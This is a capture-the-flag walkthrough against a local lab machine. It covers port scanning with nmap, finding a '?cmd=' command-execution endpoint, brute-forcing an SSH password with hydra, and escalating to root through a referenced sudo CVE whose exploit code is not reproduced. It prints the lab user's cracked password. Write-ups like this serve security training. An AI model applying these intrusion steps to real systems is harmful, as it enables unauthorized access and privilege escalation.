
---

# Penetration Testing / CTF Walkthrough

## 1. Port Scanning

First, scan all ports on the target host:

```bash
nmap -sV -sC -Pn -p- -A -O 0.0.0.0
```

- `-sV` – Service version detection
    
- `-sC` – Run default scripts
    
- `-Pn` – Treat host as online, skip ping
    
- `-p-` – Scan all ports
    
- `-A` – Aggressive scan (OS detection, version detection, script scanning)
    
- `-O` – OS detection
    

---

## 2. Check Web Pages

Visit the target in a browser or use `curl` to send a POST request:

```bash
curl -X POST http://0.0.0.0
```

At startup, the target prints the following message:

```bash
echo "VHJ5IHRoaXMgP2NtZD1scw==" | base64 -d
```

Which decodes to a command prompt URL:

```
http://0.0.0.0/?cmd=ls
```

---

## 3. Gather Information

List contents of `/home` to find the username:

```
http://0.0.0.0/?cmd=ls%20/home
```

Result:

```
User: kostanai
```

---

## 4. Brute-force SSH Password

Use `hydra` to brute-force the password for `kostanai`:

```bash
hydra -l kostanai -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt -V -s 22222 ssh://localhost -T 50
```

Found password:

```
TENmanUFactOryPOWER
```

---

## 5. Connect via SSH

Connect to the target using the discovered credentials:

```bash
ssh -p 22222 kostanai@0.0.0.0
```

Verify user access:

```bash
cat /home/kostanai/user.txt
```

---

## 6. Privilege Escalation

Check for `sudo` permissions:

```bash
sudo --version
```

Exploit available: [CVE-2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main)

---

## 7. Exploit Execution

1. Create a new file in `/tmp`:
    

```bash
nano exploit.sh
```

2. Paste the exploit code from the CVE repository.
    
3. Make it executable:
    

```bash
chmod +x exploit.sh
```

Run the exploit to gain root access:

```bash
cd /root
cat root.txt
```

---

✅ **Result:** Full root access obtained.

---